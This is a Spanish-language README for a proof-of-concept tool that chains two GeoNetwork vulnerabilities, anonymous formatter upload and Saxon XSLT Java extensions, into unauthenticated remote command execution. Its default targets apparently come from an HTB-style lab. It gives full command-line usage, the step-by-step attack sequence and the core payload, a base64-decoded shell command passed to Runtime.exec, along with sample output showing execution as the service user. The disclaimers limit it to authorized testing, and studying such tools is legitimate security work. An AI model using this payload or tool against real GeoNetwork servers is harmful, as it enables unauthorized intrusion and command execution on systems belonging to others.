# GeoNetwork Formatter RCE

PoC interactivo para la cadena de vulnerabilidades de GeoNetwork que permite
ejecución remota de comandos sin autenticación mediante un formatter XSL.

> **Uso estrictamente autorizado.** Solo para laboratorios propios o targets
> donde tengas permiso explícito. El autor no se hace
> responsable del uso indebido.

---

## Vulnerabilidades

| CVE | Descripción |
|---|---|
| **CVE-2026-63219** | Falta de control de autorización en `/srv/api/formatters`: un usuario anónimo puede subir formatters `.xsl` / `.zip`. |
| **CVE-2026-58400** | Saxon XSLT se inicializa sin `FEATURE_SECURE_PROCESSING` y con extension functions habilitadas, por lo que un stylesheet puede invocar `java.lang.Runtime.exec()`. |

Encadenadas: **upload anónimo → render de un record público → RCE** como el usuario
del proceso GeoNetwork (`geonetwork` en GN01).

- **Afectado:** GeoNetwork `>= 4.3.0, < 4.4.12` y `< 4.2.17`.
- **Parcheado:** `4.4.12` / `4.2.17`.

---

## Características

- Banner ASCII y salida con colores ANSI (`--no-color` para desactivar).
- **Modo interactivo** (`-i`) que pregunta host, puerto, esquema, ruta, UUID,
  resolve-IP, comando y timeout.
- Soporte de **vhost** mediante `--resolve-ip`, sin tocar `/etc/hosts`.
- Comando arbitrario con `--cmd` (el PoC original solo ejecutaba `id`).
- Captura de **stdout y stderr** por separado.
- Cookie jar configurable y limpieza automática de archivos temporales.
- Resumen del objetivo y del resultado en cajas formateadas.

---

## Requisitos

- Python 3.10+
- `curl` instalado y en el `PATH`

No depende de librerías externas.

---

## Instalación

```bash
git clone <REPO> geonetwork-rce
cd geonetwork-rce
chmod +x geonetwork_formatter_rce.py
```

---

## Uso

### Modo interactivo (recomendado)

```bash
./geonetwork_formatter_rce.py -i
```

Te irá preguntando cada valor; pulsa **Enter** para conservar el por defecto.

### Modo banderas

```bash
./geonetwork_formatter_rce.py \
  --host geo.airways.htb \
  --resolve-ip 10.10.10.5 \
  --port 80 \
  --path /geonetwork \
  --uuid b8c9d0e1-cdef-0123-4567-888888888888 \
  --cmd 'id; hostname'
```

Si el servicio responde directamente por IP, puedes usar `--base-url`:

```bash
./geonetwork_formatter_rce.py \
  --base-url http://10.10.10.5/geonetwork \
  --uuid b8c9d0e1-cdef-0123-4567-888888888888 \
  --cmd 'id'
```

---

## Opciones

| Opción | Default | Descripción |
|---|---|---|
| `--scheme` | `http` | Esquema de la URL (`http` / `https`). |
| `--host` | `geo.airways.htb` | Hostname o IP del objetivo. |
| `--port` | `80` | Puerto HTTP. |
| `--path` | `/geonetwork` | Ruta base de GeoNetwork. |
| `--base-url` | — | URL completa; sobrescribe `scheme/host/port/path`. |
| `--resolve-ip` | — | IPv4 privada a la que mapear el hostname (vhost-safe). |
| `--uuid` | — | UUID de un record existente (obligatorio). |
| `--cmd` | `id; hostname` | Comando a ejecutar en el servidor. |
| `--cookies` | tempfile | Ruta del cookie jar. |
| `--timeout` | `180` | Timeout por petición, en segundos. |
| `-i`, `--interactive` | off | Modo interactivo. |
| `--no-color` | off | Desactiva ANSI. |
| `-q`, `--quiet` | off | No muestra el banner. |

---

## Cómo funciona

1. `GET /srv/eng/catalog.search` para obtener el cookie `XSRF-TOKEN` anónimo.
2. `POST /srv/api/formatters` con un `.xsl` que usa extensiones Java de Saxon:

   ```xml
   Runtime:exec(Runtime:getRuntime(), 'sh -c echo${IFS}<b64>|base64${IFS}-d|sh')
   ```

3. `GET /srv/api/records/<uuid>/formatters/<name>` para disparar el render.
4. El stylesheet lee `InputStream` y `ErrorStream` del proceso y devuelve la
   salida dentro de `<pre>`, que el script parsea y muestra.

---

## Salida de ejemplo (sanitizada)

```text
[*] Obteniendo XSRF-TOKEN anónimo ...
[+] XSRF: 3f9a1c2e8b74…
[*] Subiendo formatter fmt9c1a2b3e ...
[+] Formatter subido (HTTP 201)
[*] Renderizando record para disparar Runtime.exec ...

══════════════════════════════════════════════════════════════════════

┌─ OUTPUT ─────────────────────────────────────────────────────────┐
│ OUT:                                                             │
│ uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)  │
│ GN01                                                             │
│ ERR:                                                             │
└──────────────────────────────────────────────────────────────────┘

══════════════════════════════════════════════════════════════════════
[+] Listo.
```

---

## Troubleshooting

- **`El hostname requiere --resolve-ip`**: el objetivo usa vhost. Pasa
  `--resolve-ip <IP>` o usa `--base-url` con la IP literal.
- **`No se pudo alcanzar el objetivo`**: comprueba VPN, IP y puerto.
- **`El objetivo no devolvió XSRF-TOKEN`**: la ruta de búsqueda cambió; verifica
  `/srv/eng/catalog.search`.
- **`Sin salida del comando`**: UUID inválido, formatter no renderizado o versión
  ya parcheada (`>= 4.4.12`).
- **`Upload HTTP 500`**: en algunos despliegues el upload devuelve 500 pero
  escribe igual; el script lo tolera.

---

## Aviso legal

Este software se proporciona **solo para fines educativos y pruebas autorizadas**
en sistemas propios o con consentimiento explícito. No está destinado a ser
utilizado contra sistemas de terceros. El uso de este código implica que aceptas
toda la responsabilidad derivada de sus acciones y cumples con las leyes
aplicables.
